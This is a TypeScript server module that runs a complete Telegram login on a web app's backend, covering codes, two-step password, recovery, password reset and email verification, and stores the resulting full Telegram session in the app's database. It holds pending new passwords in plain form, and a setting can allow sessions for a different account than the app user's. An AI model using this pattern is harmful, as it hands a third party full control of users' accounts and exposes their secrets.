import type { Api as TelegramApi } from 'teleproto';
import type { HydratedDocument } from 'mongoose';

import type { TelegramLoginRequest, TelegramLoginResponse } from '@/lib/telegramLogin';
import type { LoginPage } from '@/lib/telegramLoginCopy';
import { connectDb } from '@/server/db';
import { TelegramLoginAttempt, type TelegramLoginAttemptDoc } from '@/server/models/TelegramLoginAttempt';
import { User, type UserDoc } from '@/server/models/User';
import { toSession } from '@/server/serialize';
import { pickSessionString, withTelegramClient } from '@/server/telegram/client';
import { allowTelegramIdMismatch, getApiCredentials } from '@/server/telegram/credentials';
import { mapRpcError, TelegramLoginError } from '@/server/telegram/errors';
import {
  isFirebaseSentCode,
  isSentCodeSuccess,
  isTl,
  mapSentCodeResult,
  type MappedSentCode,
} from '@/server/telegram/sentCode';
import { Api, errors, helpers, mtprotoPassword, TelegramClient } from '@/server/telegram/teleproto';

const ATTEMPT_TTL_MS = 30 * 60 * 1000;
const SECRET_FIELDS = '+sessionString +recoveryCode +pendingPassword';

type Attempt = HydratedDocument<TelegramLoginAttemptDoc>;

function bumpExpiry() {
  return new Date(Date.now() + ATTEMPT_TTL_MS);
}

function numericId(id: unknown): number {
  if (typeof id === 'number') {
    return id;
  }
  if (typeof id === 'bigint') {
    return Number(id);
  }
  if (id && typeof id === 'object' && 'toJSNumber' in id) {
    return Number((id as { toJSNumber: () => number }).toJSNumber());
  }
  return Number(id);
}

function normalizePhone(phone: string) {
  const digits = phone.replace(/\D/g, '');
  if (digits.length < 7 || digits.length > 15) {
    throw new TelegramLoginError('شماره تلفن نامعتبر است.', 400, 'invalidPhone');
  }
  return `+${digits}`;
}

function toResponse(attempt: Attempt, extra: Partial<TelegramLoginResponse> = {}): TelegramLoginResponse {
  return {
    loginId: String(attempt._id),
    page: (attempt.page as LoginPage) || 'phone',
    timeout: attempt.timeout ?? 0,
    codeLength: attempt.codeLength ?? 5,
    nextType: (attempt.nextType as LoginPage | null) || null,
    missedPrefix: attempt.missedPrefix || undefined,
    fragmentUrl: attempt.fragmentUrl || undefined,
    wordBeginning: attempt.wordBeginning || undefined,
    emailPattern: attempt.emailPattern || attempt.email || undefined,
    googleSigninAllowed: Boolean(attempt.googleSigninAllowed),
    appleSigninAllowed: Boolean(attempt.appleSigninAllowed),
    passwordHint: attempt.passwordHint || undefined,
    hasRecovery: Boolean(attempt.hasRecovery),
    recoveryEmailPattern: attempt.recoveryEmailPattern || undefined,
    resetWaitUntil: attempt.resetWaitUntil ? new Date(attempt.resetWaitUntil).toISOString() : null,
    ...extra,
  };
}

function applyMapped(attempt: Attempt, mapped: MappedSentCode) {
  attempt.phoneCodeHash = mapped.phoneCodeHash;
  attempt.page = mapped.page;
  attempt.nextType = mapped.nextType;
  attempt.timeout = mapped.timeout;
  attempt.codeLength = mapped.codeLength;
  attempt.missedPrefix = mapped.missedPrefix ?? '';
  attempt.fragmentUrl = mapped.fragmentUrl ?? '';
  attempt.wordBeginning = mapped.wordBeginning ?? '';
  if (mapped.emailPattern) {
    attempt.emailPattern = mapped.emailPattern;
  }
  attempt.googleSigninAllowed = Boolean(mapped.googleSigninAllowed);
  attempt.appleSigninAllowed = Boolean(mapped.appleSigninAllowed);
  if (
    mapped.page === 'sms' ||
    mapped.page === 'app' ||
    mapped.page === 'call' ||
    mapped.page === 'flash' ||
    mapped.page === 'missed' ||
    mapped.page === 'fragment' ||
    mapped.page === 'word' ||
    mapped.page === 'phrase'
  ) {
    attempt.codePage = mapped.page;
  }
}

async function loadAttempt(telegramId: number, loginId: string): Promise<Attempt> {
  if (!loginId) {
    throw new TelegramLoginError('نشست ورود منقضی شد.', 400, 'codeExpired');
  }

  const attempt = await TelegramLoginAttempt.findOne({ _id: loginId, telegramId }).select(SECRET_FIELDS);

  if (!attempt) {
    throw new TelegramLoginError('نشست ورود منقضی شد. دوباره شماره را وارد کنید.', 400, 'codeExpired');
  }

  return attempt as Attempt;
}

async function persistSession(attempt: Attempt, sessionString?: string) {
  const next = pickSessionString(sessionString, attempt.sessionString);
  if (!next) {
    return;
  }
  attempt.sessionString = next;
  attempt.expiresAt = bumpExpiry();
  await attempt.save();
}

async function invokeWithAttempt<T>(attempt: Attempt, fn: (client: TelegramClient) => Promise<T>): Promise<T> {
  try {
    const { result, sessionString } = await withTelegramClient(attempt.sessionString, fn);
    await persistSession(attempt, sessionString);
    return result;
  } catch (error) {
    const saved =
      error instanceof TelegramLoginError
        ? error.sessionString
        : error && typeof error === 'object'
          ? (error as { sessionString?: string }).sessionString
          : undefined;
    await persistSession(attempt, saved);
    mapRpcError(error);
  }
}

function sendCodeSettings() {
  return new Api.CodeSettings({
    allowFlashcall: false,
    currentNumber: false,
    allowAppHash: false,
    allowMissedCall: false,
    allowFirebase: false,
  });
}

async function invokeSendCode(client: TelegramClient, phoneNumber: string): Promise<TelegramApi.auth.TypeSentCode> {
  const { apiId, apiHash } = getApiCredentials();
  try {
    return await client.invoke(
      new Api.auth.SendCode({
        phoneNumber,
        apiId,
        apiHash,
        settings: sendCodeSettings(),
      }),
    );
  } catch (error) {
    if (error instanceof errors.RPCError && error.errorMessage === 'AUTH_RESTART') {
      return invokeSendCode(client, phoneNumber);
    }
    throw error;
  }
}

async function resolveSentCode(
  client: TelegramClient,
  phoneNumber: string,
  sent: TelegramApi.auth.TypeSentCode,
): Promise<TelegramApi.auth.TypeSentCode> {
  if (isFirebaseSentCode(sent)) {
    return client.invoke(
      new Api.auth.ResendCode({
        phoneNumber,
        phoneCodeHash: sent.phoneCodeHash,
        reason: 'firebase_unavailable',
      }),
    );
  }
  return sent;
}

async function finishAuthorization(
  user: UserDoc,
  attempt: Attempt,
  tgUser: TelegramApi.TypeUser,
  sessionString: string,
): Promise<TelegramLoginResponse> {
  if (!(tgUser instanceof Api.User)) {
    throw new TelegramLoginError('ورود کامل نشد.', 500);
  }

  const mtprotoUserId = numericId(tgUser.id);
  if (!Number.isFinite(mtprotoUserId)) {
    throw new TelegramLoginError('شناسه کاربر تلگرام نامعتبر است.', 500);
  }

  if (mtprotoUserId !== user.telegramId && !allowTelegramIdMismatch()) {
    throw new TelegramLoginError(
      'این شماره متعلق به حساب تلگرامی که اپ را باز کرده نیست.',
      403,
      'wrongAccount',
    );
  }

  const storedSession = pickSessionString(sessionString, attempt.sessionString);
  if (!storedSession) {
    throw new TelegramLoginError('نشست تلگرام پس از ورود ساخته نشد.', 500);
  }

  await connectDb();

  const sessionUpdate = {
    mtprotoSession: storedSession,
    mtprotoUserId,
    mtprotoPhone: tgUser.phone || '',
    mtprotoUsername: tgUser.username || '',
    isVerified: true,
    telegramLoginRequired: false,
    updatedAt: new Date(),
  };

  // Native collection write: mongoose `select: false` / a stale compiled
  // User schema in `next dev` can drop `mtprotoSession` from $set.
  const write = await User.collection.updateOne({ telegramId: user.telegramId }, { $set: sessionUpdate });
  if (write.matchedCount === 0) {
    throw new TelegramLoginError('کاربر یافت نشد.', 500);
  }

  const updated = await User.findOne({ telegramId: user.telegramId })
    .select('+mtprotoSession')
    .lean<UserDoc>();

  await TelegramLoginAttempt.deleteOne({ _id: attempt._id });

  if (!updated) {
    throw new TelegramLoginError('کاربر یافت نشد.', 500);
  }

  if (!updated.mtprotoSession) {
    throw new TelegramLoginError('نشست تلگرام در پایگاه داده ذخیره نشد.', 500);
  }

  return {
    loginId: '',
    page: 'success',
    timeout: 0,
    codeLength: 0,
    nextType: null,
    done: true,
    session: toSession(updated),
  };
}

async function handleAuthorizationResult(
  user: UserDoc,
  attempt: Attempt,
  result: TelegramApi.auth.TypeAuthorization,
  sessionString: string,
): Promise<TelegramLoginResponse> {
  if (result instanceof Api.auth.AuthorizationSignUpRequired || isTl(result, 'auth.AuthorizationSignUpRequired')) {
    throw new TelegramLoginError(
      'این شماره در تلگرام ثبت نشده است. ابتدا در برنامهٔ رسمی تلگرام ثبت‌نام کنید.',
      400,
      'signUpRequired',
    );
  }

  await persistSession(attempt, sessionString);
  return finishAuthorization(
    user,
    attempt,
    result.user,
    pickSessionString(sessionString, attempt.sessionString),
  );
}

async function loadPasswordState(client: TelegramClient, attempt: Attempt) {
  const password = await client.invoke(new Api.account.GetPassword());
  attempt.passwordHint = password.hint || '';
  attempt.hasRecovery = Boolean(password.hasRecovery);
  attempt.recoveryEmailPattern = password.emailUnconfirmedPattern || password.loginEmailPattern || '';
  if (password.pendingResetDate) {
    attempt.resetWaitUntil = new Date(password.pendingResetDate * 1000);
  }
  attempt.page = 'password';
  return password;
}

async function sendCode(user: UserDoc, phone: string): Promise<TelegramLoginResponse> {
  const phoneNumber = normalizePhone(phone);
  await connectDb();
  await TelegramLoginAttempt.deleteMany({ telegramId: user.telegramId });

  try {
    const { result: rawSent, sessionString } = await withTelegramClient('', async (client) => {
      const sent = await invokeSendCode(client, phoneNumber);
      if (isSentCodeSuccess(sent)) {
        return sent;
      }
      return resolveSentCode(client, phoneNumber, sent);
    });

    if (isSentCodeSuccess(rawSent)) {
      const attempt = (await TelegramLoginAttempt.create({
        telegramId: user.telegramId,
        sessionString,
        phoneNumber,
        page: 'success',
        expiresAt: bumpExpiry(),
      })) as Attempt;
      return handleAuthorizationResult(user, attempt, rawSent.authorization, sessionString);
    }

    const mapped = mapSentCodeResult(rawSent);
    const attempt = (await TelegramLoginAttempt.create({
      telegramId: user.telegramId,
      sessionString,
      phoneNumber,
      phoneCodeHash: mapped.phoneCodeHash,
      page: mapped.page,
      codePage: mapped.page,
      nextType: mapped.nextType,
      timeout: mapped.timeout,
      codeLength: mapped.codeLength,
      missedPrefix: mapped.missedPrefix ?? '',
      fragmentUrl: mapped.fragmentUrl ?? '',
      wordBeginning: mapped.wordBeginning ?? '',
      emailPattern: mapped.emailPattern ?? '',
      googleSigninAllowed: Boolean(mapped.googleSigninAllowed),
      appleSigninAllowed: Boolean(mapped.appleSigninAllowed),
      expiresAt: bumpExpiry(),
    })) as Attempt;

    return toResponse(attempt, { page: mapped.page });
  } catch (error) {
    mapRpcError(error);
  }
}

async function submitCode(user: UserDoc, loginId: string, code: string): Promise<TelegramLoginResponse> {
  const phoneCode = code.trim();
  if (!phoneCode) {
    throw new TelegramLoginError('کد نامعتبر است.', 400, 'wrongCode');
  }

  const attempt = await loadAttempt(user.telegramId, loginId);

  try {
    const { result, sessionString } = await withTelegramClient(attempt.sessionString, async (client) =>
      client.invoke(
        new Api.auth.SignIn({
          phoneNumber: attempt.phoneNumber,
          phoneCodeHash: attempt.phoneCodeHash,
          phoneCode,
        }),
      ),
    );
    return handleAuthorizationResult(user, attempt, result, sessionString);
  } catch (error) {
    const saved =
      error instanceof TelegramLoginError
        ? error.sessionString
        : error && typeof error === 'object'
          ? (error as { sessionString?: string }).sessionString
          : undefined;
    await persistSession(attempt, saved);

    if (error instanceof errors.SessionPasswordNeededError) {
      await invokeWithAttempt(attempt, async (client) => {
        await loadPasswordState(client, attempt);
      });
      await attempt.save();
      return toResponse(attempt, { page: 'password' });
    }

    mapRpcError(error);
  }
}

async function resend(user: UserDoc, loginId: string): Promise<TelegramLoginResponse> {
  const attempt = await loadAttempt(user.telegramId, loginId);
  const sent = await invokeWithAttempt(attempt, (client) =>
    client.invoke(
      new Api.auth.ResendCode({
        phoneNumber: attempt.phoneNumber,
        phoneCodeHash: attempt.phoneCodeHash,
      }),
    ),
  );

  if (isSentCodeSuccess(sent)) {
    return handleAuthorizationResult(user, attempt, sent.authorization, attempt.sessionString);
  }

  applyMapped(attempt, mapSentCodeResult(sent));
  await attempt.save();
  return toResponse(attempt);
}

async function submitPassword(user: UserDoc, loginId: string, password: string): Promise<TelegramLoginResponse> {
  if (!password) {
    throw new TelegramLoginError('گذرواژه را وارد کنید.', 400, 'wrongPassword');
  }

  const attempt = await loadAttempt(user.telegramId, loginId);

  try {
    const { result, sessionString } = await withTelegramClient(attempt.sessionString, async (client) => {
      const srp = await client.invoke(new Api.account.GetPassword());
      const check = await mtprotoPassword.computeCheck(srp, password);
      return client.invoke(new Api.auth.CheckPassword({ password: check }));
    });
    return handleAuthorizationResult(user, attempt, result, sessionString);
  } catch (error) {
    const saved =
      error instanceof TelegramLoginError
        ? error.sessionString
        : error && typeof error === 'object'
          ? (error as { sessionString?: string }).sessionString
          : undefined;
    await persistSession(attempt, saved);
    mapRpcError(error);
  }
}

async function requestRecovery(user: UserDoc, loginId: string): Promise<TelegramLoginResponse> {
  const attempt = await loadAttempt(user.telegramId, loginId);
  const recovery = await invokeWithAttempt(attempt, (client) =>
    client.invoke(new Api.auth.RequestPasswordRecovery()),
  );
  attempt.recoveryEmailPattern = recovery.emailPattern;
  attempt.hasRecovery = true;
  attempt.page = 'recover';
  attempt.codeLength = 6;
  await attempt.save();
  return toResponse(attempt);
}

async function submitRecoveryCode(user: UserDoc, loginId: string, code: string): Promise<TelegramLoginResponse> {
  const attempt = await loadAttempt(user.telegramId, loginId);
  const ok = await invokeWithAttempt(attempt, (client) =>
    client.invoke(new Api.auth.CheckRecoveryPassword({ code })),
  );
  if (!ok) {
    throw new TelegramLoginError('کد نامعتبر است.', 400, 'wrongCode');
  }
  attempt.recoveryCode = code;
  attempt.page = 'newPass1';
  await attempt.save();
  return toResponse(attempt);
}

async function setNewPassword(
  user: UserDoc,
  loginId: string,
  password: string,
  password2: string,
): Promise<TelegramLoginResponse> {
  if (!password || password !== password2) {
    throw new TelegramLoginError('گذرواژه‌ها یکسان نیستند.', 400, 'passwordsMismatch');
  }
  const attempt = await loadAttempt(user.telegramId, loginId);
  attempt.pendingPassword = password;
  attempt.page = 'newPass2';
  await attempt.save();
  return toResponse(attempt);
}

async function buildNewPasswordSettings(client: TelegramClient, password: string, hint: string) {
  const pwd = await client.invoke(new Api.account.GetPassword());
  if (pwd.newAlgo instanceof Api.PasswordKdfAlgoUnknown) {
    throw new TelegramLoginError('نسخهٔ برنامه را به‌روز کنید.', 400, 'updateApp');
  }
  pwd.newAlgo.salt1 = Buffer.concat([pwd.newAlgo.salt1, helpers.generateRandomBytes(32)]);
  const hash = await mtprotoPassword.computeDigest(pwd.newAlgo, password);
  return new Api.account.PasswordInputSettings({
    newAlgo: pwd.newAlgo,
    newPasswordHash: hash,
    hint,
  });
}

async function finishNewPassword(user: UserDoc, loginId: string, hint: string): Promise<TelegramLoginResponse> {
  const attempt = await loadAttempt(user.telegramId, loginId);
  if (!attempt.pendingPassword || !attempt.recoveryCode) {
    throw new TelegramLoginError('نشست ورود منقضی شد.', 400, 'codeExpired');
  }

  try {
    const { result, sessionString } = await withTelegramClient(attempt.sessionString, async (client) => {
      const newSettings = await buildNewPasswordSettings(client, attempt.pendingPassword, hint);
      return client.invoke(
        new Api.auth.RecoverPassword({
          code: attempt.recoveryCode,
          newSettings,
        }),
      );
    });
    return handleAuthorizationResult(user, attempt, result, sessionString);
  } catch (error) {
    const saved =
      error instanceof TelegramLoginError
        ? error.sessionString
        : error && typeof error === 'object'
          ? (error as { sessionString?: string }).sessionString
          : undefined;
    await persistSession(attempt, saved);
    mapRpcError(error);
  }
}

async function resetPassword(user: UserDoc, loginId: string): Promise<TelegramLoginResponse> {
  const attempt = await loadAttempt(user.telegramId, loginId);

  try {
    const { result, sessionString } = await withTelegramClient(attempt.sessionString, async (client) =>
      client.invoke(new Api.account.ResetPassword()),
    );
    await persistSession(attempt, sessionString);

    if (result instanceof Api.account.ResetPasswordFailedWait) {
      throw new TelegramLoginError(
        'بازنشانی حساب لغو شد چون اخیراً تأیید شده است.',
        400,
        'resetCancelled',
      );
    }

    if (result instanceof Api.account.ResetPasswordRequestedWait) {
      attempt.resetWaitUntil = new Date(result.untilDate * 1000);
      attempt.page = 'resetWait';
      await attempt.save();
      return toResponse(attempt);
    }

    const empty = await withTelegramClient(attempt.sessionString, async (client) =>
      client.invoke(new Api.auth.CheckPassword({ password: new Api.InputCheckPasswordEmpty() })),
    );
    return handleAuthorizationResult(user, attempt, empty.result, empty.sessionString);
  } catch (error) {
    const saved =
      error instanceof TelegramLoginError
        ? error.sessionString
        : error && typeof error === 'object'
          ? (error as { sessionString?: string }).sessionString
          : undefined;
    await persistSession(attempt, saved);

    if (error instanceof errors.SessionPasswordNeededError) {
      attempt.page = 'password';
      await attempt.save();
      return toResponse(attempt);
    }

    mapRpcError(error);
  }
}

async function sendEmail(user: UserDoc, loginId: string, email: string): Promise<TelegramLoginResponse> {
  const trimmed = email.trim();
  if (!trimmed.includes('@')) {
    throw new TelegramLoginError('آدرس ایمیل نامعتبر است.', 400, 'emailInvalid');
  }

  const attempt = await loadAttempt(user.telegramId, loginId);
  const sent = await invokeWithAttempt(attempt, (client) =>
    client.sendVerifyEmailCode(attempt.phoneNumber, attempt.phoneCodeHash, trimmed),
  );
  attempt.email = trimmed;
  attempt.emailPattern = sent.emailPattern;
  attempt.codeLength = sent.length || 6;
  attempt.page = 'emailSetup';
  await attempt.save();
  return toResponse(attempt);
}

async function submitEmailCode(user: UserDoc, loginId: string, code: string): Promise<TelegramLoginResponse> {
  const attempt = await loadAttempt(user.telegramId, loginId);
  const verified = await invokeWithAttempt(attempt, (client) =>
    client.verifyEmail(attempt.phoneNumber, attempt.phoneCodeHash, { type: 'code', code }),
  );

  if (isSentCodeSuccess(verified.sentCode)) {
    return handleAuthorizationResult(user, attempt, verified.sentCode.authorization, attempt.sessionString);
  }

  applyMapped(attempt, mapSentCodeResult(verified.sentCode));
  await attempt.save();
  return toResponse(attempt);
}

async function resetEmail(user: UserDoc, loginId: string): Promise<TelegramLoginResponse> {
  const attempt = await loadAttempt(user.telegramId, loginId);
  const sent = await invokeWithAttempt(attempt, (client) =>
    client.resetLoginEmail(attempt.phoneNumber, attempt.phoneCodeHash),
  );

  if (isSentCodeSuccess(sent)) {
    return handleAuthorizationResult(user, attempt, sent.authorization, attempt.sessionString);
  }

  applyMapped(attempt, mapSentCodeResult(sent));
  await attempt.save();
  return toResponse(attempt);
}

async function checkPaid(user: UserDoc, loginId: string): Promise<TelegramLoginResponse> {
  const attempt = await loadAttempt(user.telegramId, loginId);
  const sent = await invokeWithAttempt(attempt, (client) =>
    client.invoke(
      new Api.auth.ResendCode({
        phoneNumber: attempt.phoneNumber,
        phoneCodeHash: attempt.phoneCodeHash,
      }),
    ),
  );

  if (isSentCodeSuccess(sent)) {
    return handleAuthorizationResult(user, attempt, sent.authorization, attempt.sessionString);
  }

  applyMapped(attempt, mapSentCodeResult(sent));
  await attempt.save();
  return toResponse(attempt);
}

async function cancel(user: UserDoc, loginId: string): Promise<TelegramLoginResponse> {
  const attempt = await TelegramLoginAttempt.findOne({ _id: loginId, telegramId: user.telegramId }).select(
    SECRET_FIELDS,
  );

  if (attempt) {
    try {
      await withTelegramClient(attempt.sessionString, (client) =>
        client.invoke(
          new Api.auth.CancelCode({
            phoneNumber: attempt.phoneNumber,
            phoneCodeHash: attempt.phoneCodeHash,
          }),
        ),
      );
    } catch {
      // Cancelling is best-effort; the attempt is dropped either way.
    }
    await TelegramLoginAttempt.deleteOne({ _id: attempt._id });
  }

  return {
    loginId: '',
    page: 'phone',
    timeout: 0,
    codeLength: 0,
    nextType: null,
  };
}

export async function handleTelegramLogin(user: UserDoc, body: TelegramLoginRequest): Promise<TelegramLoginResponse> {
  await connectDb();

  switch (body.action) {
    case 'sendCode':
      return sendCode(user, body.phone);
    case 'submitCode':
      return submitCode(user, body.loginId, body.code);
    case 'resend':
      return resend(user, body.loginId);
    case 'password':
      return submitPassword(user, body.loginId, body.password);
    case 'requestRecovery':
      return requestRecovery(user, body.loginId);
    case 'submitRecoveryCode':
      return submitRecoveryCode(user, body.loginId, body.code);
    case 'setNewPassword':
      return setNewPassword(user, body.loginId, body.password, body.password2);
    case 'finishNewPassword':
      return finishNewPassword(user, body.loginId, body.hint);
    case 'resetPassword':
      return resetPassword(user, body.loginId);
    case 'sendEmail':
      return sendEmail(user, body.loginId, body.email);
    case 'submitEmailCode':
      return submitEmailCode(user, body.loginId, body.code);
    case 'resetEmail':
      return resetEmail(user, body.loginId);
    case 'checkPaid':
      return checkPaid(user, body.loginId);
    case 'cancel':
      return cancel(user, body.loginId);
    default:
      throw new TelegramLoginError('درخواست نامعتبر است.', 400);
  }
}
